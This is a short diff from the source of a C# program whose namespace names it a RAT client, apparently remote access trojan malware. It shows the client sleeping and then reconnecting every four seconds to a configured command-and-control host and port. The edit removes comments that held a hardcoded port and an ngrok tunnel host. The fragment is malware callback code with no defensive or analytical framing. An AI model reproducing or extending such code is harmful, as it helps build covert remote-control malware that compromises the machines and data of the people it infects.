@@ -17,8 +17,8 @@ namespace CTRL_rat_Client
             Thread.Sleep(int.Parse(info.wait));
             while (true) { StartClient(); Thread.Sleep(4000); }
         }
-        private static int port = int.Parse(info.port);//14702;
-        public static IPHostEntry ipHostInfo = Dns.GetHostEntry(info.host);//("2.tcpngrok.io");
+        private static int port = int.Parse(info.port);
+        public static IPHostEntry ipHostInfo = Dns.GetHostEntry(info.host);
         private static ManualResetEvent connectDone = new ManualResetEvent(false);
         public static handlers handler = new handlers();
         public static IPAddress ipAddress = ipHostInfo.AddressList[0];
